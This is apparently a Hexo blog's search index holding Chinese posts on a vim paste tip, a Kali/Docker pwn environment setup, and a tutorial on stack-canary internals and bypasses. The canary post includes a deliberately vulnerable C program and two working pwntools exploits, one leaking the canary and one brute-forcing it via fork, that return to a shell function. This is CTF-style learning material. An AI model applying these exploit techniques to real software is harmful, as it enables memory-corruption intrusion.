<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[关于vim的复制粘贴]]></title>
    <url>%2F2019%2F06%2F01%2F%E5%85%B3%E4%BA%8Evim%E7%9A%84%E5%A4%8D%E5%88%B6%2F</url>
    <content type="text"><![CDATA[学习Canary相关的东西时，因为要从网上复制粘贴各种代码，因为缩进问题，复制完之后的效果惨不忍睹，比如这样： 过于惨不忍睹，markdown的代码框展现不出来效果 解决方法的话就是在粘贴前先输入:set paste，接着进入insert模式的时候后面就会多个(paste)，这样复制进去的就和你原本看到的一样了]]></content>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Canary原理以及绕过]]></title>
    <url>%2F2019%2F05%2F31%2Fcanary%2F</url>
    <content type="text"><![CDATA[Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | Canary value | +-----------------+ | 局部变量 | Low | | Address 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 函数在fs:[0x28]取一个值，放入栈中，在函数结束前与fs:[0x28]进行异或，如果结果为0，Canary则未修改，不为0就是发生了缓冲区溢出。 12345;异或检查Canarymov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 而fs寄存器又指向了当前栈的TLS结构(TLS全称线程局部存储器，它用来保存变量或回调函数)，fs:[0x28]则指向了stack_guard。 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ...&#125; tcbhead_t; 如果可以溢出覆盖tls的话，就可以绕过Canary 如果Canary已被修改，程序会走到 __stack_chk_fail 1234567891011121314//eglibc-2.19/debug/stack_chk_fail.cvoid __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; Canary绕过泄露Canary漏洞代码： 1234567891011121314151617181920212223242526// ex2.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) &#123; system("/bin/sh");&#125;void init() &#123; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);&#125;void vuln() &#123; char buf[100]; for(int i=0;i&lt;2;i++)&#123; read(0, buf, 0x200); printf(buf); &#125;&#125;int main(void) &#123; init(); puts("Hello Hacker!"); vuln(); return 0;&#125; 编译为32位程序，开启Canary保护，关闭PIE： 1gcc -m32 -fstack-protector -no-pie ex2.c -o ex2 ida打开，在vuln处下断点，程序执行到这里时往栈上添加Canary。 12.text:565C5280 mov eax, large gs:14h.text:565C5286 mov [ebp+var_C], eax ;ebp+var_C=FF80175C 接着到read的位置 buf的位置在FF8016F8，Canary的位置在FF80175C，FF80175C-FF8016F8=0x64=100个字节 也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到Canary的低位字节。 Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串，想要打印出Canary就只有覆盖低位字节 得到Canary值后接下来就是普通的rop了 123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom pwn import *context.binary = &apos;ex2&apos;#context.log_level = &apos;debug&apos;io = process(&apos;./ex2&apos;)get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]io.recvuntil(&quot;Hello Hacker!\n&quot;)# leak Canarypayload = &quot;A&quot;*100io.sendline(payload)io.recvuntil(&quot;A&quot;*100)Canary = u32(io.recv(4))-0xalog.info(&quot;Canary:&quot;+hex(Canary))# Bypass Canarypayload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)io.send(payload)io.recv()io.interactive() 爆破Canary pid_t fork( void); 返回值： 若成功调用一次则返回两个值，子进程返回0，父进程返回子进程ID；否则，出错返回-1 个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程（child process）。fork函数被调用一次但返回两次。两次返回的唯一区别是子进程中返回0值而父进程中返回子进程ID。 子进程是父进程的副本，它将获得父进程数据空间、堆、栈等资源的副本。注意，子进程持有的是上述存储空间的“副本”，这意味着父子进程间不共享这些存储空间。 利用fork就可以进行对Canary的爆破 ida: 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; __pid_t v3; // [esp+Ch] [ebp-Ch] init(); while ( 1 ) &#123; v3 = fork(); if ( v3 &lt; 0 ) break; //fork失败了就退出 if ( v3 ) &#123; wait(0); //父进程卡在这里 &#125; else &#123; puts("welcome"); //子进程执行漏洞 fun(); puts("recv sucess"); &#125; &#125; puts("fork error"); exit(0); 直接下断点调试的话是断在父进程里面，一直在wait()，可以先在fun()中的read()函数处下断点，接着去docker里面直接运行程序，从ida里面attach上去，此时里面有两个bin1，pid值较大的那一个就是子进程。 经过调试后，得知buf到Canary需要100字节，Canary到return地址需要12字节，编写exp: 1234567891011121314151617181920212223242526272829from pwn import *#context.log_level = 'debug'debug=1if debug: io=process("./bin1")else: io=remote("172.17.0.2",10001)canary='\x00'io.recvuntil("welcome\n")for i in range(3): for j in range(256): io.send('a'*100+canary+chr(j)) tmp=io.recvuntil("welcome\n") //输出recv success之后还会输出welcome，所以根据welcome判断，recvall()不知道为什么会卡住 if "recv" in tmp: canary+=chr(j) breakget_flag=0x0804863Bpayload='a'*100+canary+'a'*12+p32(get_flag)io.sendline(payload)print io.recvline() //recvall也会卡住]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建环境]]></title>
    <url>%2F2019%2F05%2F30%2F%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[kali配置安装docker正常情况下用docker官方的文档安装就行，但是执行到下面这条命令时会报错 1234$ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 错误： 1aptsources.distro.NoDistroTemplateException: Error: could not find a distribution template for Kali/n/a 具体原因是什么至今也没查到，可能是和kali版本有关系吧 解决方法：自己添加源就可以了 1deb https://mirrors.aliyun.com/docker-ce/linux/debian wheezy stable 安装成功后执行systemctl enable docker使docker开机自启。 再找一个合适的环境pull下，找了半天发现pwnbox不错，有一个run.sh可以快捷启动环境，但是没有ida调试文件和没有端口映射，自己改了改文件之后就好用多了。 run.sh: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env bash# Run superkojiman/pwnbox container in docker.# Store your .gdbinit, .radare2rc, .vimrc, etc in a ./rc directory. The contents will be copied to# /root/ in the container.ESC="\x1B["RESET=$ESC"39m"RED=$ESC"31m"GREEN=$ESC"32m"BLUE=$ESC"34m"if [[ -z $&#123;1&#125; ]]; then echo -e "$&#123;RED&#125;Missing argument CTF name.$&#123;RESET&#125;" exit 0fictf_name=$&#123;1&#125;# Create docker container and run in the background# Add this if you need to modify anything in /proc: --privileged docker run -it \ -h $&#123;ctf_name&#125; \ -d \ -p 23946:23946 \ --security-opt seccomp:unconfined \ --name $&#123;ctf_name&#125; \ superkojiman/pwnbox# Tar config files in rc and extract it into the containerif [[ -d rc ]]; then cd rc if [[ -f rc.tar ]]; then rm -f rc.tar fi for i in .*; do if [[ ! $&#123;i&#125; == "." &amp;&amp; ! $&#123;i&#125; == ".." ]]; then tar rf rc.tar $&#123;i&#125; fi done cd - &gt; /dev/null 2&gt;&amp;1 cat rc/rc.tar | docker cp - $&#123;ctf_name&#125;:/root/ rm -f rc/rc.tarelse echo -e "$&#123;RED&#125;No rc directory found. Nothing to copy to container.$&#123;RESET&#125;"fi# Create stop/rm script for containercat &lt;&lt; EOF &gt; $&#123;ctf_name&#125;-stop.sh#!/bin/bashdocker stop $&#123;ctf_name&#125;docker rm $&#123;ctf_name&#125;rm -f $&#123;ctf_name&#125;-stop.shEOFchmod 755 $&#123;ctf_name&#125;-stop.sh# Create a workdir for this CTFdocker exec $&#123;ctf_name&#125; mkdir /root/workdocker cp linux_server $&#123;ctf_name&#125;:/root/workdocker cp linux_server64 $&#123;ctf_name&#125;:/root/work# Get a shellecho -e "$&#123;GREEN&#125; ______ $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___________ ___________ /___________ __$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;___ __ \\_ | /| / /_ __ \\_ __ \\ __ \\_ |/_/$&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;__ /_/ /_ |/ |/ /_ / / / /_/ / /_/ /_&gt; &lt; $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;_ .___/____/|__/ /_/ /_//_.___/\\____//_/|_| $&#123;RESET&#125;"echo -e "$&#123;GREEN&#125;/_/ by superkojiman $&#123;RESET&#125;"echo ""docker attach $&#123;ctf_name&#125; 需要同目录下有linux_server和linux_server64文件(在ida安装目录下的dbgsrv里面)。 接下来对本机vim进行配置，安装YouCompleteMe和一些缩进的配置。 .vimrc: 123456789101112131415161718192021222324set nocompatibleset rtp+=~/.vim/plugged/set numberset t_Co=256syntax onset autoindentset smartindentset tabstop=4set shiftwidth=4"themecolorscheme molokai"YouCompleteMelet g:ycm_global_ycm_extra_conf = '~/.ycm_extra_conf.py'let g:ycm_min_num_of_chars_for_completion=1let g:ycm_warning_symbol='&gt;*'let g:ycm_error_symbol='&gt;&gt;'call plug#begin('~/.vim/plugged')Plug 'Valloric/YouCompleteMe'call plug#end() YouCompleteMe clone到vim里面后，还需要进去编译一下，执行 123sudo apt install build-essential cmake python3-devcd ~/.vim/plugged/YouCompleteMepython3 install.py --clang-completer 到此为止就差不多够用了]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F05%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
